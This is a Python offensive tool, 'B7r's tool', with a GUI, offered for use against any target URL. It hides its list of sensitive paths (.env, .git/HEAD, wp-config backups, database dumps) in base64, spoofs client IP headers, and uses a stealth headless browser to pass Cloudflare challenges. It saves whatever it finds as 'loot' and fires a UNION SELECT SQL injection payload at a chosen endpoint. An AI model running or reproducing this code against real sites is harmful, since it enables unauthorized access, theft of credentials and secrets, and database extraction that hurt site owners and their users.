# =====================================================================
# [ B7r's tool — ULTIMATE ANTI-WAF & BYPASS SUITE v16.0 ]
# Author: B7r Security Architecture
# Description: Fully Advanced CLI/GUI Suite with Deep Cloudflare & WAF Evasion
# =====================================================================

import asyncio
import threading
import aiohttp
import os
import json
import base64
import random
import time
import sys
import argparse
from datetime import datetime
from urllib.parse import urlparse

# استيراد واجهة المستخدم الرسومية
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox, filedialog
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False

# استيراد محرك المتصفح الحقيقي لتخطي الحمايات العميقة
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# --- CONFIGURATION & ENCRYPTED DEEP VECTORS ---
TOOL_INFO = {
    "name": "B7r's tool",
    "version": "16.0-ULTIMATE",
    "codename": "PHANTOM-BYPASS",
    "author": "B7r"
}

ENCRYPTED_DEEP_VECTORS = [
    "cm9ib3RzLnR4dA==",          # robots.txt
    "c2l0ZW1hcC54bWw=",          # sitemap.xml
    "LmVudg==",                  # .env
    "LmdpdC9IRUFE",              # .git/HEAD
    "Y29uZmlnLmpzb24=",          # config.json
    "ZGF0YWJhc2Uuc3Fs",          # database.sql
    "YmFja3VwLnppcA==",          # backup.zip
    "d3AtY29uZmlnLnBocC5iYWs=",  # wp-config.php.bak
    "cGFja2FnZS5qc29u",          # package.json
    "Y29tcG9zZXIuanNvbg==",      # composer.json
    "Lmh0dGFjY2Vzcw==",         # .htaccess
    "cGhwaW5mby5waHA=",          # phpinfo.php
    "YWRtaW4=",                  # admin
    "YWRtaW5pc3RyYXRvcg==",      # administrator
    "d3AtbG9naW4ucGhw",         # wp-login.php
    "d3AtYWRtaW4=",              # wp-admin
    "bG9naW4=",                  # login
    "dXNlci9sb2dpbg==",          # user/login
    "ZGFzaGJvYXJk",              # dashboard
    "Y29udHJvbHBhbmVs",          # controlpanel
    "cGFuZWw=",                  # panel
    "YXV0aA==",                   # auth
    "YXBpL3VzZXJz",              # api/users
    "YXBpL3YxL3N0YXR1cw==",      # api/v1/status
    "c3lzdGVtLmluag=="           # system.ini
]

def decode_v(encoded):
    try:
        return base64.b64decode(encoded.encode('utf-8')).decode('utf-8')
    except:
        return ""


# =====================================================================
# SECURE STORAGE & ADVANCED HEADERS MANAGER
# =====================================================================
class UltimateSecurityCore:
    def __init__(self):
        self.base_dir = r"C:/Users/mohamed/Desktop/src"
        self._init_storage()
        self.agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 17_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/20.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
        ]

    def _init_storage(self):
        if not os.path.exists(self.base_dir):
            try:
                os.makedirs(self.base_dir, exist_ok=True)
            except:
                pass

    def get_target_dir(self, target_url):
        try:
            parsed = urlparse(target_url)
            domain = parsed.netloc if parsed.netloc else target_url.replace("https://", "").replace("http://", "").split("/")[0]
            safe_domain = "".join(c for c in domain if c.isalnum() or c in ('_', '-', '.'))
            if not safe_domain:
                safe_domain = "target_node"
            sub_dir = os.path.join(self.base_dir, safe_domain)
            if not os.path.exists(sub_dir):
                os.makedirs(sub_dir, exist_ok=True)
            return sub_dir
        except:
            return self.base_dir

    def get_stealth_headers(self, target_url):
        ip = f"{random.randint(1, 235)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        parsed = urlparse(target_url)
        return {
            "Host": parsed.netloc,
            "User-Agent": random.choice(self.agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "X-Forwarded-For": ip,
            "X-Real-IP": ip,
            "CF-Connecting-IP": ip,
            "Referer": target_url,
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="138"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
            "Connection": "keep-alive"
        }


# =====================================================================
# GUI INTERFACE DESIGN (B7r's tool)
# =====================================================================
class UltimateB7rGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("B7r's tool — Ultimate Anti-WAF & Bypass Suite v16.0")
        self.root.geometry("1080x760")
        self.root.configure(bg="#07090e")

        self.core = UltimateSecurityCore()
        self.logs = []

        self._build_interface()

    def _build_interface(self):
        # Header Banner
        header = tk.Frame(self.root, bg="#0f172a", bd=2, relief=tk.GROOVE)
        header.pack(pady=10, padx=15, fill=tk.X)

        tk.Label(header, text="[ B7r's tool — ULTIMATE BYPASS SUITE ]", fg="#38bdf8", bg="#0f172a", font=("Consolas", 16, "bold")).pack(pady=5)
        pw_status = "Playwright Neural Bypass: Online" if PLAYWRIGHT_AVAILABLE else "Playwright Neural Bypass: Offline (Run pip install playwright)"
        tk.Label(header, text=pw_status, fg="#34d399" if PLAYWRIGHT_AVAILABLE else "#f87171", bg="#0f172a", font=("Consolas", 9)).pack(pady=2)

        # Config Panel
        cfg_frame = tk.LabelFrame(self.root, text=" Target & Endpoint Configuration ", fg="#38bdf8", bg="#07090e", font=("Consolas", 10, "bold"), bd=2, relief=tk.GROOVE)
        cfg_frame.pack(pady=5, padx=15, fill=tk.X)

        r1 = tk.Frame(cfg_frame, bg="#07090e")
        r1.pack(pady=8, fill=tk.X, padx=10)

        tk.Label(r1, text="Target URL:", fg="#f8fafc", bg="#07090e", font=("Consolas", 10)).pack(side=tk.LEFT, padx=5)
        self.target_box = tk.Entry(r1, width=42, font=("Consolas", 10), bg="#1e293b", fg="#38bdf8", insertbackground="white", bd=1)
        self.target_box.pack(side=tk.LEFT, padx=5)

        tk.Label(r1, text="Custom Endpoint:", fg="#f8fafc", bg="#07090e", font=("Consolas", 10)).pack(side=tk.LEFT, padx=5)
        self.param_box = tk.Entry(r1, width=20, font=("Consolas", 10), bg="#1e293b", fg="#38bdf8", insertbackground="white", bd=1)
        self.param_box.pack(side=tk.LEFT, padx=5)

        # Action Buttons
        btns = tk.Frame(self.root, bg="#07090e")
        btns.pack(pady=10, padx=15, fill=tk.X)

        b_style = {"font": ("Consolas", 9, "bold"), "bg": "#1e293b", "fg": "#38bdf8", "activebackground": "#38bdf8", "activeforeground": "#07090e", "relief": tk.RAISED, "bd": 2}

        tk.Button(btns, text="1. Fast Stealth Omni Scan", command=lambda: self.run_task(1), **b_style).pack(side=tk.LEFT, expand=True, padx=3, ipady=6)
        tk.Button(btns, text="2. Playwright WAF Bypass", command=lambda: self.run_task(2), **b_style).pack(side=tk.LEFT, expand=True, padx=3, ipady=6)
        tk.Button(btns, text="3. Advanced SQLi Check", command=lambda: self.run_task(3), **b_style).pack(side=tk.LEFT, expand=True, padx=3, ipady=6)
        tk.Button(btns, text="4. Secure JSON Dumper", command=lambda: self.run_task(4), **b_style).pack(side=tk.LEFT, expand=True, padx=3, ipady=6)

        # Console Stream
        console_fr = tk.LabelFrame(self.root, text=" Execution Output Stream ", fg="#38bdf8", bg="#07090e", font=("Consolas", 10, "bold"), bd=2, relief=tk.GROOVE)
        console_fr.pack(pady=5, padx=15, fill=tk.BOTH, expand=True)

        self.console = scrolledtext.ScrolledText(console_fr, wrap=tk.WORD, bg="#020617", fg="#34d399", font=("Consolas", 9), state=tk.DISABLED, insertbackground="white")
        self.console.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # Footer Actions
        ft = tk.Frame(self.root, bg="#07090e")
        ft.pack(pady=10, padx=15, fill=tk.X)

        tk.Button(ft, text="Export Master Report (JSON)", command=self.export_report, font=("Consolas", 9, "bold"), bg="#047857", fg="#ffffff").pack(side=tk.LEFT, padx=5, ipady=4)
        tk.Button(ft, text="Clear Console", command=self.clear_console, font=("Consolas", 9), bg="#334155", fg="#ffffff").pack(side=tk.LEFT, padx=5, ipady=4)

    def write_console(self, text):
        self.console.config(state=tk.NORMAL)
        self.console.insert(tk.END, text + "\n")
        self.console.see(tk.END)
        self.console.config(state=tk.DISABLED)

    def clear_console(self):
        self.console.config(state=tk.NORMAL)
        self.console.delete(1.0, tk.END)
        self.console.config(state=tk.DISABLED)

    def run_task(self, mode):
        target = self.target_box.get().strip()
        if not target:
            messagebox.showerror("Error", "Target URL is mandatory!")
            return
        if not target.startswith("http"):
            target = "https://" + target
        param = self.param_box.get().strip()
        threading.Thread(target=lambda: asyncio.run(self.execute_async_backend(mode, target, param)), daemon=True).start()

    async def execute_async_backend(self, mode, target, param):
        target_dir = self.core.get_target_dir(target)
        self.write_console(f"\n[⚡️] B7r's tool ULTIMATE ENGAGED ON: {target}")
        self.write_console(f"[📂] Isolated Target Path: {target_dir}")

        # وضع التخطي الحقيقي عبر Playwright (وضع رقم 2)
        if mode == 2 and PLAYWRIGHT_AVAILABLE:
            self.write_console("[🛡] Launching Playwright Headless Stealth Browser...")
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=["--disable-blink-features=AutomationControlled", "--no-sandbox", "--disable-infobars"]
                )
                context = await browser.new_context(
                    user_agent=random.choice(self.core.agents),
                    viewport={"width": 1920, "height": 1080}
                )
                page = await context.new_page()
                try:
                    await page.goto(target, timeout=40000, wait_until="networkidle")
                    await page.mouse.move(250, 250)
                    await page.wait_for_timeout(5000) # اجتياز تحديات Cloudflare JavaScript
                    
                    content = await page.content()
                    self.write_console(f"[🔥] BYPASS SUCCESSFUL! Content length: {len(content)}")
                    
                    save_path = os.path.join(target_dir, "playwright_bypassed_target.html")
                    with open(save_path, "w", encoding="utf-8") as f:
                        f.write(content)
                    self.write_console(f"    --> Saved securely: {save_path}")
                    self.logs.append({"timestamp": datetime.utcnow().isoformat(), "action": "Playwright Bypass", "target": target, "status": "SUCCESS"})
                    await browser.close()
                except Exception as e:
                    self.write_console(f"[!] Playwright bypass error: {e}")
                    await browser.close()
            return

        # وضع المسح السريع عبر aiohttp وتخطي الحمايات بالترويسات
        connector = aiohttp.TCPConnector(limit=500, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            if mode == 1 or mode == 3:
                vectors = [decode_v(v) for v in ENCRYPTED_DEEP_VECTORS]
                if param:
                    vectors.append(param.lstrip('/'))
                
                sem = asyncio.Semaphore(100)
                async def fetch_path(p_item):
                    async with sem:
                        url = f"{target.rstrip('/')}/{p_item}"
                        headers = self.core.get_stealth_headers(target)
                        try:
                            async with session.get(url, headers=headers, timeout=6) as resp:
                                body = await resp.text()
                                if "cf-browser-verification" in body or "Attention Required!" in body:
                                    self.write_console(f"    [!] Cloudflare WAF Challenge on /{p_item}. Try Playwright Mode (#2).")
                                elif resp.status == 200 and len(body) > 10 and "404 Not Found" not in body:
                                    self.write_console(f"    [🔥] EXFILTRATED MATCH: /{p_item} (HTTP 200)")
                                    safe_name = p_item.replace('/', '_').replace('.', '_') + "_loot.txt"
                                    full_path = os.path.join(target_dir, safe_name)
                                    with open(full_path, "w", encoding="utf-8", errors="ignore") as f:
                                        f.write(body)
                                    self.logs.append({"timestamp": datetime.utcnow().isoformat(), "action": "Stealth Exfiltration", "target": url, "status": "SUCCESS"})
                        except:
                            pass

                await asyncio.gather(*(fetch_path(v) for v in vectors))
                self.write_console("[*] Stealth Omni Scan sequence finished.")

            elif mode == 4:
                self.write_console("[*] Executing Secure JSON Schema Dumper...")
                endpoint = param if param else f"{target}/index.php?id=1"
                dump_url = endpoint + "' UNION SELECT 1, version(), database()-- -"
                headers = self.core.get_stealth_headers(target)
                try:
                    async with session.get(dump_url, headers=headers, timeout=6) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            j_path = os.path.join(target_dir, "ultimate_database_dump.json")
                            with open(j_path, "w", encoding="utf-8") as jf:
                                json.dump({"target": dump_url, "data": content}, jf, indent=4, ensure_ascii=False)
                            self.write_console(f"    [🔥] JSON Schema Dump secured: {j_path}")
                            self.logs.append({"timestamp": datetime.utcnow().isoformat(), "action": "JSON Dumper", "target": dump_url, "status": "SUCCESS"})
                except Exception as e:
                    self.write_console(f"[!] Dumper error: {e}")

    def export_report(self):
        if not self.logs:
            messagebox.showwarning("Warning", "No logs to export.")
            return
        rep_path = os.path.join(self.core.base_dir, "b7r_ultimate_master_report.json")
        try:
            with open(rep_path, "w", encoding="utf-8") as f:
                json.dump(self.logs, f, indent=4, ensure_ascii=False)
            messagebox.showinfo("Success", f"Master Report exported to:\n{rep_path}")
            self.write_console(f"[*] Report successfully written: {rep_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to export: {e}")


def main():
    if not TKINTER_AVAILABLE:
        print("[!] Tkinter is missing.")
        sys.exit(1)
    root = tk.Tk()
    app = UltimateB7rGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()